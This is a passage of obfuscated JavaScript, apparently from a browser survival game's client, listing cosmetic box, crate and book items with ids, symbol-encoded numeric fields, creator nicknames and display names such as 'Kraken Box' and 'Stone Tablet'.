					id: 27,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆΔΔⲆⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠⵠⵠⲆⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Flower Box"
				}, {
					id: 46,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠⲆⲆⲆΔⵠ,
					"ΔΔᐃ": ⲆΔ.ΔⲆΔΔΔᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[21],
					name: "Blue Box"
				}, {
					id: 75,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠⵠⵠⲆᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆΔⲆᐃⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Night Stars Crate"
				}, {
					id: ⲆⲆⵠΔⵠ,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠᐃⲆⵠⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃΔⵠΔΔⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Beehive"
				}, {
					id: ⲆⲆⲆΔⲆΔᐃ,
					"ᐃΔⲆ": ⲆΔ.ΔΔⲆᐃΔⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ΔΔⵠⵠΔⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Wooden and Golden Box"
				}, {
					id: 21,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠᐃⵠⵠⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃΔⵠΔᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Gravestone"
				}, {
					id: 25,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠΔΔⲆⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆᐃΔⲆⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[19],
					name: "Sky Box"
				}, {
					id: 29,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⲆⲆⲆⲆᐃ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠⵠⲆⵠⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[36],
					name: "Golden Box"
				}, {
					id: 34,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠᐃⵠΔⲆᐃ,
					"ΔΔᐃ": ⲆΔ.ⲆᐃΔΔΔⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[19],
					name: "Water Crate"
				}, {
					id: 35,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃⵠᐃⵠΔⵠ,
					"ΔΔᐃ": ⲆΔ.ΔᐃΔᐃⲆⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[ⲆⲆⵠᐃⲆΔⲆ],
					name: "Glass Crate"
				}, {
					id: 70,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆΔⲆᐃΔⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆΔⵠΔΔⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[373],
					name: "Crystal Sky Box"
				}, {
					id: 74,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆⵠΔⵠⲆᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠⲆⲆΔᐃⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Reclaimed Crate"
				}, {
					id: 77,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃⵠΔⲆᐃΔ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆᐃⵠⵠΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Workplace Accident"
				}, {
					id: ᐃⲆᐃᐃΔ,
					"ᐃΔⲆ": ⲆΔ.ΔΔΔⵠⲆΔⵠ,
					"ΔΔᐃ": ⲆΔ.ΔⲆⲆᐃᐃⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Wooden and Diamond Box"
				}, {
					id: ⲆⲆⵠᐃⲆⵠⲆ,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠᐃΔΔⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠⲆᐃᐃΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Don't Hit Me"
				}, {
					id: 26,
					"ᐃΔⲆ": ⲆΔ.ᐃΔⲆΔⵠⲆΔ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆⵠⵠΔⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Underwater Box"
				}, {
					id: 31,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠΔΔⲆΔΔ,
					"ΔΔᐃ": ⲆΔ.ΔΔⵠⲆⵠⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[19],
					name: "Items Pile"
				}, {
					id: 32,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⲆΔΔⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆΔᐃᐃⵠⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Cake Box"
				}, {
					id: 33,
					"ᐃΔⲆ": ⲆΔ.ᐃΔᐃΔⲆⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆⲆΔΔᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Christmas Cake Box"
				}, {
					id: 36,
					"ᐃΔⲆ": ⲆΔ.ⵠΔᐃⲆⵠᐃΔ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠᐃⲆᐃΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": "Fukss",
					name: "Crab Box"
				}, {
					id: 42,
					"ᐃΔⲆ": ⲆΔ.ⲆᐃΔⲆΔᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ΔᐃⲆⲆᐃΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[21],
					name: "Fishing Box"
				}, {
					id: 72,
					"ᐃΔⲆ": ⲆΔ.ΔᐃᐃⲆᐃⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃⲆᐃᐃᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Storage Machine"
				}, {
					id: 22,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠΔⵠᐃⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ⲆΔᐃΔⲆⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Let me out of here"
				}, {
					id: 17,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆΔⲆΔΔΔ,
					"ΔΔᐃ": ⲆΔ.ⵠΔᐃΔⲆᐃⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Wooden and Amethyst Box"
				}, {
					id: 24,
					"ᐃΔⲆ": ⲆΔ.ΔⲆᐃᐃⲆᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ΔᐃᐃΔΔⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Aquarium"
				}, {
					id: 28,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⲆⵠᐃᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ΔⵠⲆⵠΔᐃⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Gift Box"
				}, {
					id: 40,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠᐃⲆⵠⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆⲆΔΔⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[21],
					name: "Open Watermelon Box"
				}, {
					id: 41,
					"ᐃΔⲆ": ⲆΔ.ΔⵠⲆⵠΔⲆⲆ,
					"ΔΔᐃ": ⲆΔ.Ⲇⵠⵠᐃⵠᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[21],
					name: "Watermelon Box"
				}, {
					id: 39,
					"ᐃΔⲆ": ⲆΔ.ΔⲆⵠⲆⵠⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠⵠⵠΔᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Thornbush Box"
				}, {
					id: 43,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠⲆᐃⵠΔⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆᐃⲆΔᐃΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Rabbit in the Box"
				}, {
					id: 47,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠⲆΔⵠⲆΔ,
					"ΔΔᐃ": ⲆΔ.ⵠΔΔⲆⲆⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Garlic Plot"
				}, {
					id: 48,
					"ᐃΔⲆ": ⲆΔ.ⵠΔᐃⲆⵠᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠΔΔΔΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Pumpkin Plot"
				}, {
					id: 78,
					"ᐃΔⲆ": ⲆΔ.ΔᐃᐃᐃⵠΔⲆ,
					"ΔΔᐃ": ⲆΔ.ΔΔⵠⵠΔⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Tamon Spectrum Portal"
				}, {
					id: 45,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆⵠⲆΔΔⵠ,
					"ΔΔᐃ": ⲆΔ.ΔⲆⲆᐃΔⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Autumn Box"
				}, {
					id: 44,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠΔⵠΔⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆᐃⲆⵠΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Winter Box"
				}, {
					id: 20,
					"ᐃΔⲆ": ⲆΔ.ΔⲆⲆⲆᐃⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠΔᐃⵠΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Metal and Reidite Box"
				}, {
					id: 23,
					"ᐃΔⲆ": ⲆΔ.ΔΔⲆᐃᐃΔᐃ,
					"ΔΔᐃ": ⲆΔ.ΔⵠᐃΔᐃᐃⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Kraken Box"
				}, {
					id: 30,
					"ᐃΔⲆ": ⲆΔ.ΔᐃⵠⵠⵠⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃⲆᐃΔᐃⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[36],
					name: "Lava Box"
				}, {
					id: 37,
					"ᐃΔⲆ": ⲆΔ.ΔⲆⵠᐃᐃⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆᐃⲆΔΔⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Lava Box 2"
				}, {
					id: 49,
					"ᐃΔⲆ": ⲆΔ.ΔᐃⲆⲆᐃΔᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠᐃᐃᐃᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Box of the Rabbit"
				}, {
					id: 50,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⲆⵠⵠⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆⲆⲆᐃΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Box of the Wolf"
				}, {
					id: 51,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠⲆᐃⲆⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆᐃΔᐃⲆⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Box of the Spider"
				}, {
					id: 52,
					"ᐃΔⲆ": ⲆΔ.ΔⲆⲆⲆⵠᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ΔⵠΔⲆⵠⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Box of the Hawk"
				}, {
					id: 53,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆΔΔⵠⲆᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃⵠⵠᐃΔⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Box of the Bear"
				}, {
					id: 54,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠΔⲆᐃΔⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠᐃᐃⲆᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Box of the Fox"
				}, {
					id: 55,
					"ᐃΔⲆ": ⲆΔ.ΔΔⲆᐃⲆⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠⲆᐃΔⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Box of the Baby Mammoth"
				}, {
					id: 56,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠΔᐃⵠΔⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠᐃΔΔⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Box of the Mammoth"
				}, {
					id: 57,
					"ᐃΔⲆ": ⲆΔ.ΔΔΔⲆⲆⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ΔᐃⲆⲆⲆΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Box of the Sandworm"
				}, {
					id: 58,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠΔⲆⵠᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆⲆᐃⲆΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Box of the Vulture"
				}, {
					id: 59,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆΔⲆΔⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆᐃΔΔⲆᐃⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Box of the Kraken"
				}, {
					id: 60,
					"ᐃΔⲆ": ⲆΔ.ΔⵠⵠΔΔΔΔ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠᐃᐃᐃⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Box of the Piranha"
				}, {
					id: 61,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠΔΔᐃΔⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠΔⵠᐃᐃⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Box of the Baby Dragon"
				}, {
					id: 62,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆΔⵠΔΔᐃ,
					"ΔΔᐃ": ⲆΔ.ΔΔᐃΔΔⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Box of the Baby Lava"
				}, {
					id: 63,
					"ᐃΔⲆ": ⲆΔ.ᐃΔⲆᐃⵠᐃᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆΔΔⵠⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Box of the Dragon"
				}, {
					id: 64,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆⲆⲆΔⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ΔΔⲆᐃⵠᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Box of the Penguin"
				}, {
					id: 65,
					"ᐃΔⲆ": ⲆΔ.ⲆΔᐃᐃΔⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠΔΔⵠⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Box of the Lava Dragon"
				}, {
					id: 66,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆᐃⵠⵠⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃΔΔΔᐃΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Box of the Boar"
				}, {
					id: 67,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠΔⵠⲆΔΔ,
					"ΔΔᐃ": ⲆΔ.ⵠΔⲆⵠΔΔⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Box of the Fire mob"
				}, {
					id: 68,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆΔᐃⲆⲆᐃ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆᐃⵠΔⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Box of the Crab"
				}, {
					id: 69,
					"ᐃΔⲆ": ⲆΔ.ΔⵠⵠᐃΔⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ΔⲆⵠᐃᐃⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Box of the King Crab"
				}, {
					id: 71,
					"ᐃΔⲆ": ⲆΔ.ΔⵠΔΔⵠⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆⲆⵠⵠⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Dragon Box"
				}, {
					id: 73,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠΔΔⵠⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠΔᐃᐃⲆᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Rekt"
				}, {
					id: 76,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠΔᐃᐃᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆᐃᐃⲆⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Sleeping Tamon Dragon"
				}],
				"ⵠⵠⲆⵠⲆ": [{
					id: 0,
					"ᐃΔⲆ": ⲆΔ.ᐃΔⲆⵠΔΔᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠΔᐃᐃⵠⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠᐃⵠΔΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Book 1"
				}, {
					id: 1,
					"ᐃΔⲆ": ⲆΔ.ᐃᐃⵠⲆΔⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃⲆᐃⵠᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Book 2"
				}, {
					id: ⵠⵠΔⲆ,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆᐃⵠᐃⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃΔᐃᐃⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Book 3"
				}, {
					id: 3,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠⵠΔᐃⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ΔᐃⲆᐃΔⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Book 4"
				}, {
					id: ᐃⵠⵠΔ,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆᐃⲆⲆΔⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠΔᐃᐃⲆᐃⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Damaged Book 1"
				}, {
					id: ⲆⵠⵠⲆⲆ,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆⵠⲆΔⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆⵠΔⵠⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": "SeveR",
					name: "Damaged Book 2"
				}, {
					id: 5,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆΔΔⵠᐃᐃ,
					"ΔΔᐃ": ⲆΔ.ΔⵠⲆᐃΔⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": "Doctorpus",
					name: "Scroll"
				}, {
					id: ⵠᐃΔⵠⲆ,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⵠᐃⵠⲆΔ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠΔΔⵠᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": "Doctorpus",
					name: "Clipboard"
				}, {
					id: 7,
					"ᐃΔⲆ": ⲆΔ.ΔΔΔᐃΔΔⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆΔⲆⵠᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Seed Book"
				}, {
					id: ⲆᐃᐃΔΔ,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆΔⲆⵠᐃΔ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠⵠΔⲆΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Camo Book"
				}, {
					id: 24,
					"ᐃΔⲆ": ⲆΔ.ⲆΔᐃᐃⲆⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆⲆΔᐃⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[ⲆᐃᐃΔⵠⵠᐃ],
					name: "Stone Tablet"
				}, {
					id: 47,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠⲆᐃⵠᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠΔⲆⲆⲆᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Reclaimed Book"
				}, {
					id: 10,
					"ᐃΔⲆ": ⲆΔ.ΔⲆΔⲆⵠΔΔ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆⲆⵠᐃⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Star Book"
				}, {
					id: 8,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠⲆⵠᐃᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ΔⲆᐃΔⵠᐃⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Gold Book"
				}, {
					id: ΔⲆΔⲆⲆ,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆΔᐃᐃⲆΔ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠⵠⵠⵠΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Old Mysterious Paper"
				}, {
					id: 17,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⵠᐃⵠΔΔ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠᐃΔᐃⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Gold Engraving"
				}, {
					id: 25,
					"ᐃΔⲆ": ⲆΔ.ΔᐃΔⵠⵠⲆᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠᐃⲆⲆⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": "fatant",
					name: "Ant Book"
				}, {
					id: 32,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆᐃΔΔᐃΔ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃⵠⲆⵠⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Mummy Book"
				}, {
					id: 37,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠⵠᐃΔΔⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠΔᐃΔⲆᐃⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Garlic Book"
				}, {
					id: 38,
					"ᐃΔⲆ": ⲆΔ.ΔΔⵠΔⵠΔⲆ,
					"ΔΔᐃ": ⲆΔ.ΔΔⵠᐃΔⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Pumpkin Book"
				}, {
					id: 39,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠᐃⲆΔᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠΔⵠΔⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Christmas Tree Book"
				}, {
					id: ⲆⵠΔΔᐃᐃᐃ,
					"ᐃΔⲆ": ⲆΔ.ΔⲆΔᐃΔⵠΔ,
					"ΔΔᐃ": ⲆΔ.ΔᐃΔᐃᐃΔΔ,
